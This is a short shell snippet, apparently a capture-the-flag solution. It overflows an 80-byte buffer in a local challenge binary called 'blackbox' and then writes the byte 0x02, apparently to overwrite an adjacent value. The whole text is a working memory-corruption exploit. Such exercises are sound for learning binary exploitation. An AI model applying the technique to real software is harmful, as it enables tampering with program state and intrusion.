# The offset is in 80 chars, so we fill it and then input the char 02 (1+1)
echo -ne 'h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4ck3d!h4c\x02' | ./blackbox
